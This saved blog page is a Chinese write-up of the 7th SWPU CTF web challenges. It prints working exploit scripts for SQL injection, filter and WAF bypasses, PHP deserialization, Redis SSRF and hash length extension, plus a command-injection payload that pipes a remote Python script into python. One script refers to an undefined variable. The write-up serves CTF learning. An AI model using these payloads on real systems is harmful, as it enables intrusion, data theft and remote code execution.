@@ -1,0 +1,600 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>第七届swpu-ctf-web的writeup - l3m0n - 博客园</title>
+<link href="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/7th_swpu_ctf_web_writeup.html" id="cb_post_title_url">第七届swpu-ctf-web的writeup</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><h1 id="web100">web100</h1>
+<p>一个上传包含题目：phar可以使用相对路径，zip好像需要绝对路径。</p>
+<h1 id="web200-3">web200-3</h1>
+<p>拿到web100的shell后，是tip里面提示又tomcat，通过<br/>
+ps -aux<br/>
+看到tomcat的网站目录，上传一个shell后就是一个tomcat权限。</p>
+<p>然后用国庆期间出来的一个tomcat提权，网上都有一个坑点...就是sh里面油\r字符。</p>
+<pre><code>sed -i 's/\r$//' xxx.sh</code></pre>
+<p>然后上传这个sh文件就好了。 不要复制、不要复制、不要复制。替换后直接上传。</p>
+<p>然后运行后再kill一下tomcat的进程，最后服务重启就可以拿到root权限啦。</p>
+<h1 id="web200-1">web200-1</h1>
+<p>过滤了很多东西：</p>
+<pre><code>&lt;?php
+class fiter{
+    var $str;
+    var $order;
+
+    function sql_clean($str){
+        if(is_array($str)){
+            echo "&lt;script&gt; alert('not array!!@_@');parent.location.href='index.php'; &lt;/script&gt;";exit;
+        }
+        $filter = "/ |\*|#|,|union|like|regexp|for|and|or|file|--|\||`|&amp;|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."/i";
+        if(preg_match($filter,$str)){
+            echo "&lt;script&gt; alert('illegal character!!@_@');parent.location.href='index.php'; &lt;/script&gt;";exit;
+        }else if(strrpos($str,urldecode("%00"))){
+            echo "&lt;script&gt; alert('illegal character!!@_@');parent.location.href='index.php'; &lt;/script&gt;";exit;
+        }
+        return $this-&gt;str=$str;
+    }
+
+    function ord_clean($ord){
+        $filter = " |bash|perl|nc|java|php|&gt;|&gt;&gt;|wget|ftp|python|sh";
+        if (preg_match("/".$filter."/i",$ord) == 1){
+            return $this-&gt;order = "";
+        }
+        return $this-&gt;order = $ord;
+    }
+}</code></pre>
+<p>一个登陆页面，没有逗号，没有for，没有like，没有regexp等，这样出数据就比较麻烦。</p>
+<p>select * from admin where name=''<br/>
+通过注入'-0-'0<br/>
+select * from admin where name='a'-0-'0'<br/>
+也就是中间的0可以构造语句了。</p>
+<p>类似的还可以用+ ％ 等运算符。这是因为类型的转换。</p>
+<p>所以可以用两种方法做出来，第一个姿势是mid的，可以通过mid((password)from(1))这样来截取字符，第二个是用leading来分割字符，一位位的猜解。</p>
+<pre><code>uname=12'%(ascii(mid((passwd)from(1)))&gt;0)%'1&amp;passwd=dddd
+uname=admin'-(length(trim(leading%a0'c12366feb73§2§'%a0from%a0passwd))=20)-'0&amp;passwd=1</code></pre>
+<p>进入后台是一个命令执行。分割一下敏感字符就好了</p>
+<pre><code>a=py;b=thon;curl${IFS}http://ip/lemon.py|$($a$b)</code></pre>
+<h1 id="web200-2">web200-2</h1>
+<pre><code>index.php
+
+if (isset($_COOKIE['user'])) {
+    $login = @unserialize(base64_decode($_COOKIE['user']));
+    if (!empty($login-&gt;pass)) {
+        $status = $login-&gt;check_login();
+        if ($status == 1) {
+            $_SESSION['login'] = 1;
+            var_dump("login by cookie!!!");
+        }
+    }
+}
+
+function.php
+&lt;?php
+class help {
+
+    static function addslashes_deep($value) {
+        if (empty($value)) {
+            return $value;
+        } else {
+            if (!get_magic_quotes_gpc()) {
+                $value = is_array($value) ? array_map("help::addslashes_deep", $value) : help::mystrip_tags(addslashes($value));
+            } else {
+                $value = is_array($value) ? array_map("help::addslashes_deep", $value) : help::mystrip_tags($value);
+            }
+            return $value;
+        }
+    }
+    static function remove_xss($string) {
+        $string = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S', '', $string);
+        $parm1 = Array('javascript', 'union', 'vbscript', 'expression', 'applet', 'xml', 'blink', 'link', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'base');
+        $parm2 = Array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload', 'href', 'action', 'location', 'background', 'src', 'poster');
+        $parm3 = Array('alert', 'sleep', 'load_file', 'confirm', 'prompt', 'benchmark', 'select', 'and', 'or', 'xor', 'update', 'insert', 'delete', 'alter', 'drop', 'truncate', 'script', 'eval', 'outfile', 'dumpfile');
+        $parm = array_merge($parm1, $parm2, $parm3);
+        for ($i = 0; $i &lt; sizeof($parm); $i++) {
+            $pattern = '/';
+            for ($j = 0;
+                $j &lt; strlen($parm[$i]); $j++) {
+                if ($j &gt; 0) {
+                    $pattern .= '(';
+                    $pattern .= '(&amp;#[x|X]0([9][a][b]);?)?';
+                    $pattern .= '|(�([9][10][13]);?)?';
+                    $pattern .= ')?';}
+                $pattern .= $parm[$i][$j];
+            }
+            $pattern .= '/i';
+            $string = preg_replace($pattern, '****', $string);
+        }
+        return $string;
+    }
+    static function mystrip_tags($string) {
+        $string = help::new_html_special_chars($string);
+        $string = help::remove_xss($string);
+        return $string;
+    }
+    static function new_html_special_chars($string) {
+        $string = str_replace(array('&amp;', '"', '&lt;', '&gt;', '&amp;#'), array('&amp;', '"', '&lt;', '&gt;', '***'), $string);
+        return $string;
+    }
+    static function htmlspecialchars_($value) {
+        if (empty($value)) {
+            return $value;
+        } else {
+            if (is_array($value)) {
+                foreach ($value as $k =&gt; $v) {
+                    $value[$k] = self::htmlspecialchars_($v);
+                }
+            } else {
+                $value = htmlspecialchars($value);
+            }
+            return $value;
+        }
+    }
+    static function CheckSql($db_string, $querytype = 'select') {
+        $clean = '';
+        $error = '';
+        $old_pos = 0;
+        $pos = -1;
+        if ($querytype == 'select') {
+            $notallow1 = "[^0-9a-z@\._-]{1,}(load_file|outfile)[^0-9a-z@\.-]{1,}";
+            if (preg_match("/" . $notallow1 . "/i", $db_string)) {
+                exit("Error");
+            }
+        }
+
+        while (TRUE) {
+            $pos = strpos($db_string, '\'', $pos + 1);
+            if ($pos === FALSE) {
+                break;
+            }
+            $clean .= substr($db_string, $old_pos, $pos - $old_pos);
+            while (TRUE) {
+                $pos1 = strpos($db_string, '\'', $pos + 1);
+                $pos2 = strpos($db_string, '\\', $pos + 1);
+                if ($pos1 === FALSE) {
+                    break;
+                } elseif ($pos2 == FALSE || $pos2 &gt; $pos1) {
+                    $pos = $pos1;
+                    break;
+                }
+                $pos = $pos2 + 1;
+            }
+            $clean .= '$s$';
+            $old_pos = $pos + 1;
+        }
+        $clean .= substr($db_string, $old_pos);
+
+        $clean = trim(strtolower(preg_replace(array('~\s+~s'), array(' '), $clean)));
+        var_dump($clean);
+
+        if (strpos($clean, '@') !== FALSE OR strpos($clean, 'char(') !== FALSE OR strpos($clean, '"') !== FALSE OR strpos($clean, '$s$$s$') !== FALSE) {
+            $fail = TRUE;
+            if (preg_match("#^create table#i", $clean)) {
+                $fail = FALSE;
+            }
+            $error = "unusual character";
+        } elseif (strpos($clean, '/*') !== FALSE || strpos($clean, '-- ') !== FALSE || strpos($clean, '#') !== FALSE) {
+            $fail = TRUE;
+            $error = "comment detect";
+        } elseif (strpos($clean, 'sleep') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])sleep($|[^[a-z])~is', $clean) != 0) {
+            $fail = TRUE;
+            $error = "slown down detect";
+        } elseif (strpos($clean, 'benchmark') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])benchmark($|[^[a-z])~is', $clean) != 0) {
+            $fail = TRUE;
+            $error = "slown down detect";
+        } elseif (strpos($clean, 'load_file') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])load_file($|[^[a-z])~is', $clean) != 0) {
+            $fail = TRUE;
+            $error = "file fun detect";
+        } elseif (strpos($clean, 'into outfile') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])into\s+outfile($|[^[a-z])~is', $clean) != 0) {
+            $fail = TRUE;
+            $error = "file fun detect";
+        }
+
+        if (!empty($fail)) {
+            exit("Error" . $error);
+        } else {
+            return $db_string;
+        }
+    }
+}
+
+class login {
+    var $uid = 0;
+    var $name = "";
+    var $pass = '';
+
+    public function check_login() {
+        //mysql_conn();
+        $sqls = "select * from phpinfoadmin where username='$this-&gt;name'";
+        $sqls = help::CheckSql($sqls);
+        var_dump($sqls);
+        //$re = mysql_query($sqls);
+        $results = @mysql_fetch_array($re);
+        //echo $sqls . $results['passwd'];
+        //mysql_close();
+        if (!empty($results)) {
+            if ($results['passwd'] == $this-&gt;pass) {
+                return 1;
+            } else {
+                return 0;
+            }
+        }
+    }
+
+    public function __destruct() {
+        $this-&gt;check_login();
+    }
+
+    public function __wakeup() {
+        $this-&gt;name = help::addslashes_deep($this-&gt;name);
+        $this-&gt;pass = help::addslashes_deep($this-&gt;pass);
+    }
+}</code></pre>
+<p>这是80sec的waf，网上流传的对这个waf的绕过是用@<code>'</code>将单引号看成是一个变量，然后在这个waf有一个特性就是会把单引号里面的内容替换为<span class="math inline">\(s\)</span>，如果是这样的一个语句：</p>
+<pre><code>select * from admin where id='1' or char(@`'`) or sleep(5) ';</code></pre>
+<p>替换之后就是，然后再经过关键字检测的时候就没有敏感词啦。</p>
+<pre><code>select * from admin where id=$s$ or @`$s$;</code></pre>
+<p>类似于@<code>'</code>的绕过还有：双印号"'" 和 反印号 <code>'</code>.``.password</p>
+<p>这题只能用最后的反引号来解：<br/>
+然后还有一个就是反序化的属性修改对wakeup的绕过。</p>
+<pre><code>import time
+import requests
+import base64
+url='http://web3.08067.me/wakeup/index.php'
+string = '!@#$%&amp;\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
+
+for s in string:
+    k = ord(s)
+    print chr(k),
+
+    a=requests.session()
+    start_time = time.time()
+    a="O:5:\"login\":4:{s:3:\"uid\";i:0;s:4:\"name\";s:83:\"a' and `'`.``.id or if(ascii(substr((select flag from flag),22,1))="+str(k)+",sleep(5),0)#\";s:4:\"pass\";s:1:\"1\";}"
+    b=base64.b64encode(veneno)
+    b=a.get(url,cookies={"user":b})
+    now_time = time.time()-start_time
+    print now_time
+    print chr(k)
+    print '---'
+    print chr(k+1)</code></pre>
+<p>其中还特别需要小心的是反序化的时候的字符串长度，ascii字符的长度，有些小写字母长度就是三位数了，有些字符是两位数。</p>
+<p>flag{WakEup!_v1ry_f4N}</p>
+<h1 id="web200-4">web200-4</h1>
+<p>利用的是python url lib的ssrf漏洞来攻击redis<br/>
+需要多线程来修改其中的值，然后进入后台拿到flag。</p>
+<pre><code>import requests
+import threading
+def test():
+    while True:
+        try:
+            url = "http://web7.08067.me/web7/input"
+            data = {'value': 'http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0aSET%20admin%20xx00%0d%0aSAVE%0d%0a:6379/foo'}
+            requests.post(url, data=data)
+        except Exception, e:
+            pass
+def test2():
+    while True:
+        try:
+            url = "http://web7.08067.me/web7/admin"
+            data = {'passworld': 'xx00'}
+            text = requests.post(url, data=data).text
+            if 'flag' in text:
+                print text
+        except:
+            pass
+list = []
+for i in range(10):
+    t = threading.Thread(target=test)
+    t.setDaemon(True)
+    t.start()
+    list.append(t)
+for i in range(10):
+    t = threading.Thread(target=test2)
+    t.setDaemon(True)
+    t.start()
+    list.append(t)
+for i in list:
+    i.join()</code></pre>
+<h1 id="web300">web300</h1>
+<p>ssrf题目，<br/>
+通过file协议得到dns是一个内网ip，然后扫描得到本机地址是172.16.181.165，内网目标是172.16.181.166<br/>
+扫描目录有一个admin目录，</p>
+<p>然后本地弄一个gopher的ss</p>
+<p>最后通过注入可以拿到flag：</p>
+<pre><code>proxychains curl --data "username=1' and 1=2 union select 'c4ca4238a0b923820dcc509a6f75849b','c4ca4238a0b923820dcc509a6f75849b'#&amp;password=1&amp;submit=1" http://172.16.181.166/admin/wllmctf_login.php</code></pre>
+<h1 id="web400">web400</h1>
+<p>嗯....有源码下载：<a class="uri" href="http://web4.08067.me/web/web.zip">http://web4.08067.me/web/web.zip</a></p>
+<p>在api.php中可以删除用户和删除评论。</p>
+<pre><code>class admin {
+    var $name;
+    var $check;
+    var $data;
+    var $method;
+    var $userid;
+    var $msgid;
+
+    function check() {
+        $username = addslashes($this-&gt;name);
+        @mysql_conn();
+        $sql = "select * from user where name='$username'";
+        $result = @mysql_fetch_array(mysql_query($sql));
+        mysql_close();
+        if (!empty($result)) {
+            if ($this-&gt;check === md5($result['salt'] . $this-&gt;data . $username)) {
+                echo '(=-=)!!';
+                if ($result['role'] == 1) {
+                    return 1;
+                } else {
+                    return 0;
+                }
+            } else {
+                return 0;
+            }
+        } else {
+            return 0;
+        }
+    }
+
+    function do_method() {
+        if ($this-&gt;check() === 1) {
+            if ($this-&gt;method === 'del_msg') {
+                $this-&gt;del_msg();
+            } elseif ($this-&gt;method === 'del_user') {
+                $this-&gt;del_user();
+            } else {
+                exit();
+            }
+        }
+    }
+
+    function del_user() {
+        if ($this-&gt;userid) {
+            $user_id = intval($this-&gt;userid);
+            if ($user_id == 1) {
+                echo ('&lt;script&gt;alert("Admin can\'t delete!!")&lt;/script&gt;');
+                exit();
+            }
+            @mysql_conn();
+            $sql2 = "DELETE FROM user where userid='$user_id'";
+            if (mysql_query($sql2)) {
+                echo ('&lt;script&gt;alert("Delete user success!!")&lt;/script&gt;');
+                exit();
+            } else {
+                echo ('&lt;script&gt;alert("Delete user wrong!!")&lt;/script&gt;');
+                exit();
+            }
+
+            mysql_close();
+        } else {
+            echo ('&lt;script&gt;alert("Check Your user_id!!")&lt;/script&gt;');
+            exit();
+        }
+    }
+}
+$a = unserialize(base64_decode($api));
+$a-&gt;do_method();</code></pre>
+<p>这一段可以用md5的hash扩展来实现用户的删除：</p>
+<pre><code>if ($this-&gt;check === md5($result['salt'] . $this-&gt;data . $username))</code></pre>
+<p>在forget.php中</p>
+<pre><code>if(@$forget==1)
+{
+
+    @mysql_conn();
+    $sql = "select * from user where name='$username'";
+    $result = @mysql_fetch_array(mysql_query($sql));
+    mysql_close();
+    if (!empty($result))
+    {
+
+        if($result['salt'])
+        {
+            $check = base64_encode(md5($result['salt']));
+            $name = $result['name'];
+            header("Location:/web/repass.php?username=$name&amp;check=$check&amp;mibao=$mibao&amp;pass=$pass");
+        }
+        else
+        {
+            echo("&lt;script&gt;alert('Get salt Worng?')&lt;/script&gt;");
+        }
+    }
+    else
+    {
+        echo("&lt;script&gt;alert('Please check!!?')&lt;/script&gt;");
+    }
+}</code></pre>
+<p>直接就泄漏了md5加密的salt。</p>
+<p>hash扩展的利用是这样的</p>
+<pre><code>题目: $check = md5($salt. $text);
+已知：$text的内容是为xxx，$check也知道，$salt的长度知道，但是不知道其中的值具体是多少。
+这样可以推算出：md5($salt. $text. $add) ，这个md5值就可以算出来。
+其中$add是我们可以任意添加的数据。</code></pre>
+<p>所以在此题中，<span class="math inline">\(text是为空的， 然后\)</span>add的数据就是admin这个用户名。</p>
+<p>然后构造序列化exp:</p>
+<pre><code>&lt;?php
+class admin {
+    var $name = "admin";
+    var $check = "8f4d7a58b13a34d34f8384595a3de5f7";
+    var $data;
+    var $method = "del_user";
+    var $userid = "41";
+}
+$user = new admin();
+$user-&gt;data = $_POST['data'];
+echo base64_encode(serialize($user));
+?&gt;</code></pre>
+<p>post：<br/>
+data=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80%00%00%00%00%00%00%00</p>
+<p>注意不要把data里面的数据硬编码到脚本里面.....</p>
+<p>这样就可以删除指定id的用户。</p>
+<pre><code>sqli注入漏洞点：
+foreach(Array("_POST","_GET","_COOKIE") as $key){
+    foreach($$key as $k =&gt; $v){
+        if(is_array($v)){
+        die("hello,hacker!");
+        }
+        else{
+            $k[0] !='_'?$$k = addslashes($v):$$k = "";
+        }
+    }
+}
+
+if ($_SESSION['user']) {
+    $username = $_SESSION['user'];
+    @mysql_conn();
+    $sql = "select * from user where name='$username'";
+    $result = @mysql_fetch_array(mysql_query($sql));
+    mysql_close();
+    if ($result['userid']) {
+        $id = intval($result['userid']);
+    }
+} else {
+    exit();
+}
+
+$sql1 = "select * from msg where userid= $id order by id";
+$query = mysql_query($sql1);</code></pre>
+<p>也就是当用户不在数据库的时候，那个id不会被intval，其中id又可以通过前面的变量覆盖来赋值，导致无限制注入。</p>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2016-10-29 13:03</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=6010683" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(6010683);return false;">收藏</a></div>
+</div>
+<script src="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=6010683,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2016/10/29 13:03:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./第七届swpu-ctf-web的writeup - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
